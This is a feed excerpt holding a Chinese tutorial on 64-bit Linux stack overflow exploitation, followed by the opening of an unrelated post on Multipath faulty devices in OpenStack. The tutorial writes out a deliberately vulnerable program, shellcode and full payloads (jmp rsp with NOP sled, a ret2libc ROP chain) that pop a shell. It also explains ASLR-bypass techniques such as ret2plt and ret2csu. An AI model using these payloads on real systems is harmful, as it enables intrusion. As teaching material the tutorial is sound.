&lt;p&gt;只不过寄存器大小从32位变成了64位, 而且增加了8个通用寄存器(r8~r15).&lt;br/&gt;和x86一样, rax~rdx这四个通用寄存器也支持部分寻址:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;0x1122334455667788
  ================ RAX (64位)
          ======== EAX (低32位)
              ====  AX (低16位)
              ==    AH (高8位)
                ==  AL (低8位)&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;调用约定&quot;&gt;调用约定&lt;/h2&gt;
&lt;p&gt;32位和64位程序的区别, 更多的是体现在&lt;a href=&quot;https://en.wikipedia.org/wiki/X86_calling_conventions&quot;&gt;调用约定(Calling Convention)&lt;/a&gt;上.&lt;br/&gt;因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递&lt;br/&gt;而不是通过栈, 来获得更高的运行速度.&lt;/p&gt;
&lt;p&gt;本文主要是介绍Linux平台下的漏洞利用, 所以就专注于&lt;code&gt;System V AMD64 ABI&lt;/code&gt;&lt;br/&gt;的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递,&lt;br/&gt;如果参数个数多于6个, 再通过栈来进行传递.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ cat victim.c
int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {
    return a + b + c + d + e + f + g + h;
}
int main() {
    foo(1, 2, 3, 4, 5, 6, 7, 8);
    return 0;
}
$ gcc victim.c -o victim
$ objdump -d victim | grep &quot;&amp;lt;main&amp;gt;:&quot; -A 11
00000000000006a0 &amp;lt;main&amp;gt;:
 6a0:   55                      push   rbp
 6a1:   48 89 e5                mov    rbp,rsp
 6a4:   6a 08                   push   0x8
 6a6:   6a 07                   push   0x7
 6a8:   41 b9 06 00 00 00       mov    r9d,0x6
 6ae:   41 b8 05 00 00 00       mov    r8d,0x5
 6b4:   b9 04 00 00 00          mov    ecx,0x4
 6b9:   ba 03 00 00 00          mov    edx,0x3
 6be:   be 02 00 00 00          mov    esi,0x2
 6c3:   bf 01 00 00 00          mov    edi,0x1
 6c8:   e8 93 ff ff ff          call   660 &amp;lt;foo&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;回忆一下之前在&lt;a href=&quot;https://www.pppan.net/blog/detail/2018-03-17-exploit-the-stack&quot;&gt;栈溢出漏洞的利用和缓解&lt;/a&gt;中介绍的漏洞利用流程,&lt;br/&gt;我们的目的是通过溢出等内存破坏的漏洞来执行任意的代码, 为实现这个目的,&lt;br/&gt;就要按照调用约定来对内存进行精确布局, 然后执行恶意跳转.&lt;br/&gt;在32位的环境下, 因为函数参数都是通过栈传递, 而我们有能溢出栈&lt;br/&gt;进行任意写, 所以利用起来很直接, 到了64位环境中就需要做点改变了.&lt;/p&gt;
&lt;p&gt;在本文接下来的介绍中, 都以下面的程序为目标来说明64位环境中如何&lt;br/&gt;正确地利用漏洞, 以及如何绕过常见的漏洞缓解措施.&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;co&quot;&gt;// victim.c&lt;/span&gt;
&lt;span class=&quot;ot&quot;&gt;# include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; foo() {
    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;];
    scanf(&lt;span class=&quot;st&quot;&gt;&quot;%s&quot;&lt;/span&gt;, buf);
    printf(&lt;span class=&quot;st&quot;&gt;&quot;hello %s&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;, buf);
    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
}
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main() {
    foo();
    printf(&lt;span class=&quot;st&quot;&gt;&quot;good bye!&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;);
    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
}
&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; dummy()
{
    __asm__(&lt;span class=&quot;st&quot;&gt;&quot;nop; jmp rsp&quot;&lt;/span&gt;);
} &lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;同样的, 我们先从最宽松的环境开始.&lt;/p&gt;
&lt;h2 id=&quot;基本利用&quot;&gt;基本利用&lt;/h2&gt;
&lt;p&gt;与x86的栈溢出漏洞类似, 我们可以先用debruijn序列来获得溢出点:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gcc victim.c -o victim -g -masm=intel -fno-stack-protector -z execstack -no-pie -fno-pic
$ ragg2 -P 80 -r &amp;gt; victim.rr2
$ gdb victim
(gdb) run &amp;lt; victim.rr2 
Starting program: /home/pan/stack_overflow_demo/x64/victim &amp;lt; victim.rr2
hello AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005f0 in foo () at victim.c:8
8   }
(gdb) p $rip
$1 = (void (*)()) 0x4005f0 &amp;lt;foo+58&amp;gt;

(gdb) b 6
Breakpoint 1 at 0x4005d4: file victim.c, line 6.
(gdb) run &amp;lt; victim.rr2 
(gdb) x/xg $rbp+8
0x7fffffffd608: 0x4149414148414147&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不过, 和x86不同的是, 这里在出现段错误时, rip指针并没有被我们的序列覆盖到.&lt;br/&gt;这是因为x86在传递地址时不会进行&quot;验证&quot;. 而x64则会对根据寻址标准对地址进行检查,&lt;br/&gt;规则是48~63位必须和47位相同(从0开始), 否则处理器将会产生异常.&lt;br/&gt;这规则听起来有点怪, 不过考虑到用户空间最多只有&lt;code&gt;0x00007FFFFFFFFFF&lt;/code&gt;,&lt;br/&gt;所以对正常程序而言是有保护作用的, 详情可以参考&lt;a href=&quot;https://stackoverflow.com/questions/14789850/compile-c-to-allow-for-buffer-overflow&quot;&gt;这里&lt;/a&gt;.&lt;br/&gt;好吧, 那么该如何获得覆盖的rip值? 其实也很简单, 只要在溢出后打上断点,&lt;br/&gt;并查看$rbp+8就是我们将要覆盖的rip值了. 如上为&lt;code&gt;0x4149414148414147&lt;/code&gt;,&lt;br/&gt;转换为(小端)ASCII为&lt;code&gt;GAAHAAIA&lt;/code&gt;, 在debruijn序列的第19位, 验证如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gdb ./victim
(gdb) run &amp;lt; &amp;lt;(python -c &quot;print 'A'*18 + 'B'*4&quot;)
hello AAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
(gdb) p $rip
$1 = (void (*)()) 0x42424242&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;确实是BBBB覆盖了返回的指针. 所以栈的布局和32位下应该是类似的. 利用跳转&lt;br/&gt;&lt;code&gt;jmp rsp&lt;/code&gt;和32位没有太大区别, 假设我们目标是通过&lt;code&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt;来获取shell.&lt;/p&gt;
&lt;p&gt;先分别获得libc的基地址, system函数的偏移以及字符串的偏移:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ LD_TRACE_LOADED_OBJECTS=1 ./victim
    linux-vdso.so.1 (0x00007ffff7ffa000)
    libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a3a000)
    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd9000)
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@
   583: 000000000003f450    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1353: 000000000003f450    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6
0x1619f9&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;libc加载基地址为0x00007ffff7a3a000&lt;/li&gt;
&lt;li&gt;system()地址为0x00007ffff7a3a000+0x3f450=0x7ffff7a79450&lt;/li&gt;
&lt;li&gt;&quot;/bin/sh&quot;的地址为0x00007ffff7a3a000+0x1619f9=0x7ffff7b9b9f9&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上一节说了x64下调用约定是通过寄存器来传递函数的参数, 其中第一个参数为rdi,&lt;br/&gt;因此需要构造的payload应该如下:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;co&quot;&gt;;shellcode.asm&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;rdi&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x7ffff7b9b9f9&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;rdx&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x7ffff7a79450&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在宽松的环境下, 栈是可执行的, 所以我们用&lt;code&gt;jmp rsp&lt;/code&gt;来跳转到shellcode中:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rasm2 &quot;jmp rsp&quot;
ffe4
$ objdump -d victim | grep &quot;ff e4&quot;
  400615:   ff e4                   jmp    rsp
$ rasm2 -a x86 -b 64 -f shellcode.asm -C
&quot;\x48\xbf\xf9\xb9\xb9\xf7\xff\x7f\x00\x00\x48\xba\x50\x94\xa7\xf7\xff\x7f\x00\x00\xff\xd2&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;返回地址应覆盖为0x400615, 所以完整的payload验证如下(记得加上NOP sled):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ (python -c 'print &quot;A&quot;*18 + &quot;\x15\x06\x40\x00&quot; + &quot;\x00&quot;*4 + &quot;\x90&quot;*20 + &quot;\x48\xbf\xf9\xb9\xb9\xf7\xff\x7f\x00\x00\x48\xba\x50\x94\xa7\xf7\xff\x7f\x00\x00\xff\xd2&quot;' &amp;amp;&amp;amp; cat) | ./victim
hello AAAAAAAAAAAAAAAAAA@
whoami
pan
id
uid=1000(pan) gid=1000(pan) groups=1000(pan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),117(lpadmin),121(wireshark),999(docker)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功获得shell. 这是最原始的通过&lt;code&gt;jmp rsp&lt;/code&gt;+&lt;code&gt;NOP sled&lt;/code&gt;劫持运行流程的方式,&lt;br/&gt;和32位情况下没有太大区别.&lt;/p&gt;
&lt;h2 id=&quot;ret2libc&quot;&gt;ret2libc&lt;/h2&gt;
&lt;p&gt;return-to-libc和32位情况下的区别是函数参数需要保存在rdi寄存器中.&lt;br/&gt;然而我们只能覆盖栈的地址, 所以这时候需要借助ROP方法来控制流程,&lt;br/&gt;先跳转到程序中的&lt;code&gt;pop rdi; ret&lt;/code&gt;片段(gadget), &lt;a href=&quot;mailto:再跳转到system@libc中&quot;&gt;再跳转到system@libc中&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rasm2 &quot;pop rdi; ret&quot;
5fc3
$ rafind2 -x 5fc3 -X victim
0x683
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00000683  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............
0x00000693  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........
0x000006a3  0025 7300 6865 6c6c 6f20 2573 0a00 676f  .%s.hello %s..go
0x000006b3  6f64 2062 7965 2100 0001 1b03 3b40 0000  od bye!.....;@..
0x000006c3  0007 0000 00c4 fdff ff8c 0000 0004       ..............&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;关键是要找到合适的gadget, 在victim里找到了这俩字节, 就算不幸没找到也没关系,&lt;br/&gt;我们还可以从libc.so里去找, 这个会在后面细说.&lt;/p&gt;
&lt;p&gt;值得一提的是32位程序加载地址为0x08048000, 而64位程序加载地址为0x00400000.&lt;br/&gt;所以跳转的返回地址应该是0x00400000+0x683=0x400683, ROP链如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;栈顶(低地址) &amp;lt;-------- 栈底(高地址)
...[18字节][0x400683][&quot;/bin/sh&quot;地址][system@libc][system返回(可选)]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;和之前一样, &quot;/bin/sh&quot;和system()的地址和之前一样, 验证:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ (python -c 'print &quot;A&quot;*18 + &quot;\x83\x06\x40\x00\x00\x00\x00\x00&quot; + &quot;\xf9\xb9\xb9\xf7\xff\x7f\x00\x00&quot; + &quot;\x50\x94\xa7\xf7\xff\x7f\x00\x00&quot;' &amp;amp;&amp;amp; cat) | ./victim
hello AAAAAAAAAAAAAAAAAA�@
whoami
pan
id
uid=1000(pan) gid=1000(pan) groups=1000(pan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),117(lpadmin),121(wireshark),999(docker)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功返回到了libc中执行&lt;code&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;ret2plt&quot;&gt;ret2plt&lt;/h2&gt;
&lt;p&gt;上面用ret2libc虽然成功绕过了NX并执行命令, 但其实也不稳定. 因为我们是假定知道&lt;br/&gt;了libc的加载地址(即禁用ASLR). 不过, 在上一篇&lt;a href=&quot;https://www.pppan.net/blog/detail/2018-04-09-about-got-plt&quot;&gt;深入了解GOT,PLT和动态链接&lt;/a&gt;&lt;br/&gt;中我们说了, ASLR虽然随机化了部分虚拟地址空间, 不过PLT却不在此列, 其地址依然&lt;br/&gt;是和可执行文件的加载地址相对固定的. 如果可执行文件不是PIE(位置无关可执行文件),&lt;br/&gt;那么ELF的加载地址也是固定的. 这就使得我们可以通过跳转到PLT来绕过ASLR执行任意&lt;br/&gt;命令.&lt;/p&gt;
&lt;p&gt;利用过程和上面ret2libc类似, 只不过要将&lt;code&gt;system@libc&lt;/code&gt;的地址改为&lt;code&gt;system@plt&lt;/code&gt;.&lt;br/&gt;哈, 当然, &lt;a href=&quot;mailto:前提是我们的程序里有system@plt&quot;&gt;前提是我们的程序里有system@plt&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gdb victim_nx
(gdb) info functions 
All defined functions:

File victim.c:
void dummy();
int foo();
int main();

Non-debugging symbols:
0x0000000000400460  _init
0x0000000000400490  puts@plt
0x00000000004004a0  printf@plt
0x00000000004004b0  __isoc99_scanf@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x0000000000400620  __libc_csu_init
0x0000000000400690  __libc_csu_fini
0x0000000000400694  _fini&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可惜我们的程序并没有出现system的引用, 所以就不具体演示了, 因为无非是将ret2libc&lt;br/&gt;改一个地址而已.&lt;/p&gt;
&lt;p&gt;如果在实际程序中也这么不巧遇到这种情况怎么办? 这就要用到下面的方法了.&lt;/p&gt;

&lt;p&gt;虽然libc.so是PIC位置无关的, 但其中每个符号的相对地址是确定的,&lt;br/&gt;只要知道其中一个, 就能知道libc加载基地址和所有其他符号的位置了.&lt;br/&gt;因此不论是要找函数(如system), 数据(如&quot;/bin/bash&quot;)还是复杂的ROP gadget,&lt;br/&gt;关键都是要找libc, 一旦找到libc的基地址, 这场exploit游戏也就宣告结束了.&lt;/p&gt;
&lt;h2 id=&quot;got.plt&quot;&gt;.got.plt&lt;/h2&gt;
&lt;p&gt;在&lt;a href=&quot;https://www.pppan.net/blog/detail/2018-04-09-about-got-plt&quot;&gt;深入了解GOT,PLT和动态链接&lt;/a&gt;中我们知道, 每个函数的PLT中只包含几行代码,&lt;br/&gt;作用是设置参数并跳转到GOT, 而对应GOT在解析前包含了对应PLT的下一条指令.&lt;br/&gt;PLT的下一条指令则动态解析符号并填充对应的GOT, 称为延时加载.&lt;br/&gt;所以, GOT中有libc某些函数的真正地址, 我们可以利用它来获取libc的位置.&lt;br/&gt;这种方法也叫&lt;code&gt;GOT dereference&lt;/code&gt;, 和GOT覆盖类似, 只不过并没有真正覆盖.&lt;br/&gt;在32位情况下和64位情况下利用方式大同小异, 可以参考&lt;a href=&quot;https://www.pppan.net/blog/detail/2018-03-17-exploit-the-stack&quot;&gt;x86漏洞利用&lt;/a&gt;中的ASLR&lt;br/&gt;部分, 这里就不赘述了.&lt;/p&gt;
&lt;h2 id=&quot;offset2lib&quot;&gt;offset2lib&lt;/h2&gt;
&lt;p&gt;offset2lib是在2014年提出来的一种在x64下绕过ASLR的方法, 主要利用的是Linux&lt;br/&gt;实现ASLR的设计缺陷, 在程序启用PIE时会导致加载地址空间(区域)和动态库相同,&lt;br/&gt;从而导致ASLR熵减少. 不过这个缺陷已经在2015年修复了, 所以不展开介绍,&lt;br/&gt;感兴趣的同学可以看原文:&lt;a href=&quot;https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;Offset2lib: bypassing full ASLR on 64bit Linux&lt;/a&gt;.&lt;br/&gt;虽然漏洞已经修复, 但其想法还是很值得学习的.&lt;/p&gt;
&lt;h2 id=&quot;ret2csu&quot;&gt;ret2csu&lt;/h2&gt;
&lt;p&gt;return-to-csu, 是&lt;a href=&quot;https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf&quot;&gt;2018 BlackHat Asia上分享的一种绕过ASLR的新姿势&lt;/a&gt;.&lt;br/&gt;对于客户端程序, 我们用程序中的puts/printf可以比较简单地打印(泄漏)出libc的地址,&lt;br/&gt;只需要传入合适的参数. 在文章最开始的部分我们说了, x64下调用约定是用寄存器&lt;br/&gt;rdi,rsi,rdx...来传参, 所以关键是怎么把可控部分(栈)的值传给寄存器.&lt;/p&gt;
&lt;p&gt;ROP是个好办法, 可仅考虑可执行文件的话, 不一定能找到合适的gadget.&lt;br/&gt;对于一些网络程序, 我们可能要用write或者send函数来泄露libc, 这就需要3个或者&lt;br/&gt;更多的参数. 可惜使用常见的自动化rop工具在小型程序中难以找到合适的gadget.&lt;br/&gt;于是作者(Hector&amp;amp;Ismael)通过人眼审计可执行文件中的通用代码部分, 发现了两处&lt;br/&gt;有趣的片段, 可以让我们控制edi,rsi和rdx, 并跳转到任意地址. 而这两处片段都在&lt;br/&gt;&lt;code&gt;__libc_csu_init&lt;/code&gt;中, 所以该方法称为return-to-csu:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ objdump -d ./victim_nx | grep &quot;&amp;lt;__libc_csu_init&amp;gt;:&quot; -A35
0000000000400620 &amp;lt;__libc_csu_init&amp;gt;:
   400620:  41 57                   push   r15
   400622:  41 56                   push   r14
   400624:  41 89 ff                mov    r15d,edi
   400627:  41 55                   push   r13
   400629:  41 54                   push   r12
   40062b:  4c 8d 25 d6 07 20 00    lea    r12,[rip+0x2007d6]        # 600e08 &amp;lt;__frame_dummy_init_array_entry&amp;gt;
   400632:  55                      push   rbp
   400633:  48 8d 2d d6 07 20 00    lea    rbp,[rip+0x2007d6]        # 600e10 &amp;lt;__init_array_end&amp;gt;
   40063a:  53                      push   rbx
   40063b:  49 89 f6                mov    r14,rsi
   40063e:  49 89 d5                mov    r13,rdx
   400641:  4c 29 e5                sub    rbp,r12
   400644:  48 83 ec 08             sub    rsp,0x8
   400648:  48 c1 fd 03             sar    rbp,0x3
   40064c:  e8 0f fe ff ff          call   400460 &amp;lt;_init&amp;gt;
   400651:  48 85 ed                test   rbp,rbp
   400654:  74 20                   je     400676 &amp;lt;__libc_csu_init+0x56&amp;gt;
   400656:  31 db                   xor    ebx,ebx
   400658:  0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
   40065f:  00 
  /400660:  4c 89 ea                mov    rdx,r13
2| 400663:  4c 89 f6                mov    rsi,r14
 | 400666:  44 89 ff                mov    edi,r15d
  \400669:  41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
   40066d:  48 83 c3 01             add    rbx,0x1
   400671:  48 39 dd                cmp    rbp,rbx
   400674:  75 ea                   jne    400660 &amp;lt;__libc_csu_init+0x40&amp;gt;
   400676:  48 83 c4 08             add    rsp,0x8
  /40067a:  5b                      pop    rbx
 | 40067b:  5d                      pop    rbp
 | 40067c:  41 5c                   pop    r12
1| 40067e:  41 5d                   pop    r13
 | 400680:  41 5e                   pop    r14
 | 400682:  41 5f                   pop    r15
  \400684:  c3                      ret    &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上图标注的片段1和片段2, 联合起来就可以实现控制rdx,rsi和edi, 虽然第一个参数&lt;br/&gt;rdi只能写低32位, 不过一般write/send第一个参数都是文件描述符, 所以也足够了.&lt;br/&gt;关键是&lt;code&gt;__libc_csu_init&lt;/code&gt;这一段代码是所有GNU/cc编译链都会添加带可执行文件中的,&lt;br/&gt;这意味着对于大多数Linux x64下的程序栈溢出漏洞都可以用该方式绕过ASLR执行程序.&lt;br/&gt;对于该方法的介绍可以&lt;a href=&quot;https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf&quot;&gt;查看原文&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;x86和x86-64之间的漏洞利用思路大体相同, 只不过要注意payload的具体布局.&lt;br/&gt;二进制漏洞本身没有什么&quot;一招鲜&quot;的利用方法, 也许暂时某个方法很通用,&lt;br/&gt;但可能某次内核/工具链更新之后就失效了. 关键还是要理解堆栈布局和平台的调用约定,&lt;br/&gt;学习别人的一些利用思路, 比如ROP等. 这样就能针对不同的应用程序和不同的运行环境&lt;br/&gt;快速发现最合适的利用方式.&lt;/p&gt;
</description>
<pubDate>Sun, 15 Apr 2018 14:17:00 +0000</pubDate>
<dc:creator>有价值炮灰</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pannengzhi/p/2018-04-15-x64-stack-exploit.html</dc:identifier>
</item>
<item>
<title>Multipath在OpenStack中的faulty device的成因及解决(part 1) - 孤独的居士</title>
<link>http://www.cnblogs.com/sting2me/p/8849689.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sting2me/p/8849689.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;|&lt;/span&gt; &lt;/strong&gt;版权：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。如有问题，可以邮件：wangxu198709@gmail.com&lt;/p&gt;
&lt;hr/&gt;
&lt;h2&gt;简介：&lt;/h2&gt;
&lt;p&gt;Multipath：这个多路径软件在Linux平台广泛使用，他的功能就是可以把一个快设备对应的多条路径聚合成一个单一的multipath device。主要目的有如下两点：&lt;/p&gt;
&lt;p&gt;多路径冗余（redundancy）：当配置在&lt;strong&gt;Active/Passive&lt;/strong&gt;模式下，只有一半的路径会用来做IO，如果IO路径上有任何失败（包括，交换机故障，线路故障，后端存储故障等），可以自动切换的备用路线上，对上层应用做到基本无感知。&lt;/p&gt;
&lt;p&gt;提高性能（Performance）： 当配置在&lt;strong&gt;Active/Active&lt;/strong&gt;模式下，所以路径都可以用来跑IO（如以round-robin模式），可以提高IO速率或者延时。&lt;/p&gt;
&lt;p&gt;multipath不是本文的重点，如有需要，请移步：https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/dm_multipath/setup_overview&lt;/p&gt;

&lt;h2&gt;安装及使用：&lt;/h2&gt;
&lt;p&gt;Multipath：这个多路径软件在Linux平台广泛使用，在Debian/Ubuntu平台可以通过 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;sudo&lt;/span&gt; apt-get &lt;span&gt;install&lt;/span&gt; multipath-tools&lt;/span&gt; 安装, RedHat/CentOS 平台可以通过 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;sudo&lt;/span&gt; &lt;span&gt;yum&lt;/span&gt; &lt;span&gt;install&lt;/span&gt; device-mapper-multipath&lt;/span&gt; 安装。&lt;/p&gt;
&lt;p&gt;multipath.conf: multipath对于主流的存储阵列都有默认的配置，可以支持存储阵列的很多自带特性，如ALUA。当然用户可以在安装好后，手动创建&lt;strong&gt;&lt;em&gt;/etc/multipath.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;以下是VNX/Unity的参考配置（&lt;a href=&quot;https://docs.openstack.org/cinder/queens/configuration/block-storage/drivers/dell-emc-vnx-driver.html#best-practice&quot; target=&quot;_blank&quot;&gt;vnx cinder driver&lt;/a&gt;）：&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;blacklist {
    # Skip the files under &lt;/span&gt;/dev that are definitely not FC/&lt;span&gt;iSCSI devices
    # Different system may need different customization
    devnode &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;^(ram|raw|loop|fd|md|dm-|sr|scd|st)[0-9]*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    devnode &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;^hd[a-z][0-9]*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    devnode &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;^cciss!c[0-9]d[0-9]*[p[0-9]*]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;

    # Skip LUNZ device from VNX
    device {
        vendor &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DGC&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        product &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LUNZ&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
}

defaults {
    user_friendly_names no
    flush_on_last_del yes
}

devices {
    # Device attributed &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; EMC CLARiiON and VNX series ALUA
    device {
        vendor &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DGC&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        product &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        product_blacklist &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LUNZ&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        path_grouping_policy group_by_prio
        path_selector &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;round-robin 0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        path_checker emc_clariion
        features &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1 queue_if_no_path&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        hardware_handler &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1 alua&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        prio alua
        failback immediate
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Multipath在OpenStack中的应用及faulty device的产生：&lt;/h2&gt;
&lt;p&gt;OpenStack中，multipath可以使用在Nova和Cinder的节点上，提供对后端存储的高可用访问。在很早之前，这部分代码是分别在Nova和Cinder项目里面的，渐渐的为了维护方便，就单独拧出来一个项目：&lt;a href=&quot;https://github.com/openstack/os-brick&quot; target=&quot;_blank&quot;&gt;os-brick&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;os-brick里面很重要的两个interface是：&lt;em&gt;&lt;strong&gt;connect_volume&lt;/strong&gt;&lt;/em&gt;-负责链接一个存储上的LUN或者disk，&lt;em&gt;&lt;strong&gt;disconnect_volume&lt;/strong&gt;&lt;/em&gt;-辅助断开与存储上一个LUN的链接。&lt;/p&gt;
